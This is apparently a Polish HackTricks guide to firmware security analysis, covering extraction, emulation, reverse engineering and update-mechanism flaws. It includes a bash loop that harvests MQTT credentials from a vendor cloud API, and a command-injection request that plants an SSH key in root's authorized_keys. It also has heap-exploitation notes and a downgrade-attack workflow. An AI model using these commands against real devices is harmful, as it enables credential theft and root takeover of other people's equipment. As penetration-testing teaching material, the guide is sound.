# Analiza firmware'u

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownik ma bezpośredni kontakt. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może uzyskać dostęp do kluczowych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware'u to krytyczny etap identyfikowania podatności bezpieczeństwa.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to krytyczny pierwszy etap pozwalający zrozumieć budowę urządzenia i wykorzystywane przez nie technologie. Proces ten obejmuje gromadzenie danych dotyczących:

- Architektury CPU i uruchomionego systemu operacyjnego
- Szczegółów bootloadera
- Układu sprzętowego i datasheetów
- Metryk codebase'u i lokalizacji kodu źródłowego
- Zewnętrznych bibliotek i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych podatności

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open-source za pomocą ręcznych i zautomatyzowanych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [LGTM firmy Semmle](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do znalezienia potencjalnych problemów.

## **Pozyskiwanie firmware'u**

Firmware można pozyskać na różne sposoby, z których każdy ma inny poziom złożoności:

- **Bezpośrednio** ze źródła (developerów, producentów)
- **Budując** go na podstawie dostarczonych instrukcji
- **Pobierając** z oficjalnych stron wsparcia
- Wykorzystując zapytania **Google dork** do wyszukiwania hostowanych plików firmware'u
- Uzyskując bezpośredni dostęp do **cloud storage**, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Ekstrahując** je z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Sniffując** żądania aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **hardcoded update endpoints**
- **Zrzucając** zawartość z bootloadera lub sieci
- **Usuwając i odczytując** chip pamięci, gdy wszystkie inne metody zawiodą, za pomocą odpowiednich narzędzi sprzętowych

### Logi tylko z UART: wymuszenie root shell przez U-Boot env w pamięci flash

Jeśli RX UART jest ignorowany (dostępne są tylko logi), nadal możesz wymusić init shell poprzez **offline'ową edycję bloba środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Zlokalizuj partycję U-Boot env, edytuj `bootargs`, aby zawierało `init=/bin/sh`, i **ponownie oblicz CRC32 środowiska U-Boot** dla bloba.
3. Zapisz ponownie wyłącznie partycję env i uruchom urządzenie ponownie; na UART powinien pojawić się shell.

Jest to przydatne w przypadku urządzeń embedded, w których shell bootloadera jest wyłączony, ale partycję env można zapisywać za pośrednictwem zewnętrznego dostępu do pamięci flash.

## Analizowanie firmware'u

Teraz, gdy **masz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak należy z nim postępować. Możesz w tym celu użyć różnych narzędzi:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>`. Jeśli entropia jest niska, obraz prawdopodobnie nie jest zaszyfrowany. Jeśli entropia jest wysoka, prawdopodobnie jest zaszyfrowany (lub skompresowany w jakiś sposób).

Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych wewnątrz firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do przeanalizowania pliku.

### Uzyskiwanie systemu plików

Za pomocą wcześniej opisanych narzędzi, takich jak `binwalk -ev <bin>`, powinno być możliwe **wyodrębnienie systemu plików**.\
Binwalk zwykle wyodrębnia go do **folderu nazwanego zgodnie z typem systemu plików**, którym zazwyczaj jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma magic byte systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk do **znalezienia offsetu systemu plików i wycięcia skompresowanego systemu plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików zgodnie z jego typem, korzystając z poniższych kroków.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące polecenie **dd**, wyodrębniając system plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Po wykonaniu polecenia pliki będą znajdować się w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizowanie Firmware

Po uzyskaniu firmware niezbędne jest jego przeanalizowanie w celu zrozumienia jego struktury i potencjalnych podatności. Proces ten obejmuje wykorzystanie różnych narzędzi do analizy i wyodrębniania cennych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić ciągi znaków, przeanalizować dane binarne oraz zrozumieć szczegóły dotyczące partycji i systemu plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu nazwanego typem systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących bajtów magicznych, konieczne jest ręczne wyodrębnienie. Obejmuje ono użycie `binwalk` do zlokalizowania przesunięcia systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), używa się różnych poleceń do ręcznego wyodrębnienia zawartości.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się wyszukiwanie luk w zabezpieczeniach. Analizowane są niezabezpieczone daemony sieciowe, hardcoded credentials, API endpoints, funkcje serwera aktualizacji, niekompilowany kod, skrypty startowe oraz skompilowane pliki binarne do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** pod kątem danych uwierzytelniających użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Popularne serwery webowe i pliki binarne urządzeń IoT

Kilka narzędzi pomaga ujawnić poufne informacje i luki w systemie plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików muszą zostać dokładnie przeanalizowane pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają identyfikować niezabezpieczone pliki binarne, które mogłyby zostać wykorzystane.

## Pozyskiwanie cloud config i danych uwierzytelniających MQTT za pomocą pochodnych tokenów URL

Wiele hubów IoT pobiera konfigurację dla konkretnego urządzenia z endpointu cloud, który wygląda następująco:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można znaleźć informację, że `<token>` jest lokalnie wyprowadzany z identyfikatora urządzenia przy użyciu hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i reprezentowany jako hex zapisany wielkimi literami

Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL oraz pobranie cloud config, co często ujawnia dane uwierzytelniające MQTT w postaci plaintext oraz prefiksy topiców.

Praktyczny workflow:

1) Wyodrębnij deviceId z logów startowych UART

- Podłącz adapter UART 3.3 V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj wierszy wypisujących wzorzec adresu URL konfiguracji chmurowej oraz adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę config ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wygeneruj token w Bash i zamień digest na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Zbierz konfigurację cloud i dane uwierzytelniające MQTT

- Utwórz URL i pobierz JSON za pomocą curl; przeanalizuj go za pomocą jq, aby wyodrębnić sekrety:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Nadużycie plaintext MQTT i słabych ACL tematów (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby zasubskrybować tematy konserwacyjne i wyszukać wrażliwe zdarzenia:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, za autoryzacją)

- Wiele ekosystemów osadza bajty OUI producenta, produktu i typu, a następnie sekwencyjny sufiks.
- Możesz iterować po kandydujących identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notatki
- Zawsze uzyskaj wyraźną autoryzację przed próbą masowej enumeracji.
- Jeśli to możliwe, preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania docelowego hardware'u.


Proces emulacji firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Takie podejście może napotkać problemy związane z zależnościami od hardware'u lub architektury, jednak przeniesienie root filesystemu lub określonych plików binarnych na urządzenie o zgodnej architekturze i endianowości, takie jak Raspberry Pi, albo do gotowej maszyny wirtualnej, może ułatwić dalsze testy.

### Emulowanie pojedynczych plików binarnych

W przypadku badania pojedynczych programów kluczowe jest określenie endianowości i architektury CPU programu.

#### Przykład z architekturą MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia emulacyjne:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Dla MIPS (big-endian) używa się `qemu-mips`, a w przypadku binariów little-endian wyborem będzie `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces wygląda podobnie, a do emulacji wykorzystuje się emulator `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają pełną emulację firmware, automatyzując ten proces i ułatwiając analizę dynamiczną.

## Analiza dynamiczna w praktyce

Na tym etapie do analizy wykorzystywane jest rzeczywiste lub emulowane środowisko urządzenia. Niezbędne jest zachowanie dostępu do shellu systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, co może wymagać okresowego restartowania emulacji. Analiza powinna ponownie objąć system plików, wykorzystywać wystawione strony internetowe i usługi sieciowe oraz badać podatności bootloadera. Testy integralności firmware są kluczowe dla identyfikacji potencjalnych podatności typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania obejmuje interakcję z procesem lub binarium w jego środowisku operacyjnym, z wykorzystaniem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów oraz identyfikowania podatności za pomocą fuzzingu i innych technik.

W przypadku embedded targets bez pełnego debuggera **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapowanie komunikatów Zigbee / radio-co-processor

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces użytkownika Linux. Przydatny workflow polega na odwzorowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **RF frame** w eterze
2. **controller-side parser** w radio MCU
3. **serial/UART text or TLV protocol** przekazywany do Linuxa (na przykład `/dev/tty*`)
4. **application dispatcher** w głównym daemonie
5. **protocol-specific handler / state machine**

Taka architektura tworzy dwa cele reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odzyskaj:

- **message groups** i dispatch tables
- Które komunikaty mogą pochodzić z **network**, a które z samego kontrolera
- Dokładne **manufacturer-specific discriminator fields** (na przykład Zigbee `manufacturer_code` i custom `cluster_command`)
- Które handlery są osiągalne wyłącznie podczas **commissioning**, discovery lub faz pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch pairing i sprawdź, czy cel nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing ruchu commissioning może ujawnić **Network Key**. Zigbee 3.0 install codes ograniczają tę ekspozycję, dlatego odnotuj, czy testowane urządzenie rzeczywiście ich wymaga.

### Manufacturer-specific protocol handlers i FSM-gated reachability

Specyficzne dla vendora komendy Zigbee/ZCL są często lepszym celem niż standardowe klastry, ponieważ przekazują dane do **custom parsing code** oraz wewnętrznych **FSMs**, które mają mniej sprawdzoną walidację.<sup>[[8]](#references)</sup>

Praktyczny workflow:

- Przeanalizuj command dispatcher, aż znajdziesz **vendor-only handler**.
- Odzyskaj tabele **FSM state**, **event**, **check**, **action** i **next-state**.
- Zidentyfikuj **transitional states**, które automatycznie przechodzą dalej, oraz gałęzie retry/error, które ostatecznie resetują lub zwalniają dane kontrolowane przez atakującego.
- Potwierdź, jakie legalne wymiany protokołu są wymagane, aby umieścić daemon w podatnym stanie, zamiast zakładać, że wadliwy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na timing packet replay z użyciem Python framework może być zbyt wolny. Bardziej niezawodne podejście polega na emulowaniu legalnego urządzenia na realnym hardware (na przykład **nRF52840**) z użyciem vendor-grade stack, aby można było udostępnić właściwe **endpoints**, **attributes** oraz timing commissioning.

### Klasa błędów fragmented-download w embedded daemonach

Powtarzająca się klasa błędów firmware występuje w przypadku **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`) zapisuje `ctx->total_size` i wykonuje alokację `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają wyłącznie kontrolowane przez atakującego pola **packet-local**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia względem **original allocated size**.

Umożliwia to atakującemu wysłanie:

- Pierwszego poprawnego fragmentu z **small** declared total size, aby wymusić małą alokację heap.
- Kolejnego fragmentu z **expected offset**, ale większym `chunk_len`.
- Sfałszowanego packet-local size, który spełnia świeże checks, a jednocześnie przepełnia pierwotnie zaalokowany buffer.

Gdy podatna ścieżka znajduje się za commissioning logic, exploitation musi obejmować wystarczającą ilość **device emulation**, aby przeprowadzić cel do oczekiwanego stanu model-download lub blob-download przed wysłaniem malformed fragments.

### Protocol-driven `free()` triggers

W embedded daemonach najłatwiejszym sposobem wywołania heap metadata exploitation często nie jest „czekanie na cleanup”, lecz **wymuszenie własnej error handling protokołu**:<sup>[[8]](#references)</sup>

- Wyślij malformed follow-up fragments, aby przeprowadzić FSM do stanów **retry** lub **error**.
- Przekrocz retry threshold, aby daemon **resetował context** i zwolnił uszkodzony buffer.
- Wykorzystaj przewidywalne `free()`, aby uruchomić allocator-side primitives, zanim proces ulegnie awarii z niezwiązanych przyczyn.

Jest to szczególnie przydatne przeciwko allocatorom **musl/uClibc/dlmalloc-like** w embedded Linux, gdzie uszkodzenie chunk metadata może przekształcić unlink/unbin logic w write primitive. Stabilny pattern polega na uszkodzeniu **size field**, aby przekierować allocator traversal do **fake chunks umieszczonych wewnątrz przepełnionego buffera**, zamiast natychmiast nadpisywać prawdziwe bin pointers i powodować crash procesu.

## Binary Exploitation and Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niższego poziomu. Binary runtime protections w embedded systems są rzadkie, ale gdy występują, konieczne może być użycie technik takich jak Return Oriented Programming (ROP).

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc używa fastbins podobnych do glibc. Późniejsza duża alokacja może uruchomić `__malloc_consolidate()`, dlatego każdy fake chunk musi przejść checks (sane size, `fd = 0` oraz sąsiednie chunki rozpoznane jako "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** jeśli ASLR jest włączone, ale główny binary jest **non-PIE**, adresy `.data/.bss` wewnątrz binary są stabilne. Możesz wybrać region, który już przypomina poprawny heap chunk header, aby skierować fastbin allocation do **function pointer table**.
- **Parser-stopping NUL:** podczas parsowania JSON `\x00` w payloadzie może zatrzymać parsing, zachowując jednocześnie końcowe bytes kontrolowane przez atakującego na potrzeby stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain, który wywołuje `open("/proc/self/mem")`, `lseek()` i `write()`, może umieścić wykonywalny shellcode w znanym mapping i przekazać do niego wykonanie.

## Prepared Operating Systems for Firmware Analysis

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają prekonfigurowane środowiska do firmware security testing, wyposażone w niezbędne tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to distro przeznaczona do przeprowadzania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, zapewniając prekonfigurowane środowisko ze wszystkimi niezbędnymi tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do embedded security testing oparty na Ubuntu 18.04, z preloaded firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Nawet gdy vendor implementuje cryptographic signature checks dla firmware images, **version rollback (downgrade) protection jest często pomijana**. Jeśli boot- lub recovery-loader sprawdza jedynie signature za pomocą embedded public key, ale nie porównuje *version* (ani monotonic counter) obrazu, który ma zostać wgrany, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal posiada poprawną signature**, ponownie wprowadzając załatane podatności.<sup>[[4]](#references)</sup>

Typowy attack workflow:

1. **Obyskaj starszy signed image**
* Pobierz go z publicznego download portalu vendora, CDN lub support site.
* Wyodrębnij go z companion mobile/desktop applications (np. z `assets/firmware/` wewnątrz Android APK).
* Pobierz go z third-party repositories, takich jak VirusTotal, Internet archives, fora itd.
2. **Upload or serve the image to the device** za pośrednictwem dowolnego exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT itd.
* Wiele konsumenckich urządzeń IoT udostępnia *unauthenticated* endpointy HTTP(S), które akceptują firmware blobs zakodowane w Base64, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po downgrade wykorzystaj podatność, która została załatana w nowszym release (na przykład command-injection filter dodany później).
4. Opcjonalnie wgraj ponownie najnowszy image lub wyłącz updates, aby uniknąć wykrycia po uzyskaniu persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (zdegradowanym) firmware parametr `md5` jest bezpośrednio konkatenowany z poleceniem powłoki bez sanityzacji, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — włączenie dostępu root opartego na kluczach SSH). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, jednak brak ochrony przed downgrade'em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu vendorów dołącza pełne obrazy firmware do swoich towarzyszących aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w APK/APEX bez szyfrowania, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykły `unzip` umożliwiają wyodrębnienie podpisanych obrazów bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Obejście anti-rollback wyłącznie w updaterze w projektach z układem slotów A/B

Niektórzy vendorzy implementują **ratchet** anti-downgrade, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery albo agencie OTA w userspace). Jeśli **bootloader** później sprawdza tylko sygnaturę/CRC obrazu i ufa tablicy partycji lub metadanym slotu, ochrona przed rollbackiem nadal może zostać ominięta.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadata firmware zawierają zarówno opis wersji, jak i **security ratchet** / monotoniczny licznik.
- Updater porównuje ratchet obrazu z wartością zapisaną w persistent storage i odrzuca starsze podpisane obrazy.
- Bootloader nie parsuje tego ratchet i przed uruchomieniem sprawdza wyłącznie nagłówek, CRC oraz sygnaturę.
- Aktywacja slotu jest przechowywana osobno w tablicy partycji lub w liczniku generacji dla slotu i nie jest kryptograficznie powiązana z dokładnym digestem firmware, który został zweryfikowany.

Tworzy to prymityw **validate-one-image / boot-another-image** w systemach z dwoma slotami. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel bootowania przy użyciu aktualnego podpisanego obrazu, a następnie nadpisać slot B przed rebootem, bootloader może nadal uruchomić downgraded image, ponieważ ufa wyłącznie wcześniej zatwierdzonym metadanym slotu.

Typowy wzorzec abuse:

1. Wgraj **current signed** firmware do pasywnego slotu i uruchom standardową procedurę validation/switch, aby layout oznaczył ten slot jako następny aktywny.
2. **Nie wykonuj jeszcze rebootu**. W tej samej sesji ponownie wejdź do procedury przygotowania/wymazywania slotu.
3. Wykorzystaj nieaktualny stan bootowania lub nieaktualną logikę wyboru slotu, aby updater wymazał **ten sam fizyczny slot**, który właśnie został promowany.
4. Zapisz do tego slotu **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę validation wymuszającą ratchet i wykonaj bezpośredni reboot.
6. Bootloader wybierze promowany slot, sprawdzi wyłącznie sygnaturę/integrity i uruchomi stary obraz.

Podczas reverse engineeringu implementacji aktualizacji A/B zwróć uwagę na:

- Wybór slotu wynikający z **flag odczytywanych podczas bootowania**, które nie są odświeżane po udanym przełączeniu.
- Procedurę w stylu `prepare_passive_slot()`, która wymazuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zatwierdzonego layoutu**.
- Funkcję w stylu `part_write_layout()`, która jedynie zwiększa **generation counter** / active flag i nie zapisuje hasha zweryfikowanego obrazu.
- Sprawdzanie ratchet zaimplementowane w userspace lub kodzie updatera, ale **nieobecne w ROM / bootloaderze / etapach secure boot**.
- Procedury erase lub recovery, które pozostawiają slot oznaczony jako bootowalny, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Checklista oceny logiki aktualizacji

* Czy transport/authentication *update endpoint* jest odpowiednio chroniony (TLS + authentication)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach secure boot chain (np. sygnatury są sprawdzane przez kod ROM)?
* Czy **bootloader wymusza ten sam ratchet** co updater, zamiast sprawdzać wyłącznie sygnaturę/CRC?
* Czy metadata aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware**, czy slot może zostać zmodyfikowany po promocji?
* Po udanym przełączeniu slotu urządzenie wymusza reboot, czy późniejsze procedury update/erase są nadal dostępne w tej samej sesji?
* Czy kod userland wykonuje dodatkowe sanity checks (np. dozwolona mapa partycji, numer modelu)?
* Czy przepływy aktualizacji *partial* lub *backup* ponownie wykorzystują tę samą logikę validation?

> 💡  Jeśli któregokolwiek z powyższych elementów brakuje, platforma prawdopodobnie jest podatna na rollback attacks.

## Vulnerable firmware do ćwiczeń

Aby ćwiczyć wykrywanie vulnerabilities w firmware, użyj poniższych projektów vulnerable firmware jako punktu wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu embedded KMS/Vault

Gdy obraz aktualizacji łączy niewielką ilość plaintext metadata z dużym blobem o wysokiej entropii, przed rozpoczęciem brute-forcing wykonaj triage kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` oraz `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: kolejne 8 bajtów to salt, a pozostałe bajty to ciphertext.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, jest silną wskazówką, że masz do czynienia z ciphertextem RSA-2048 opakowującym losowe hasło/klucz sesyjny firmware.
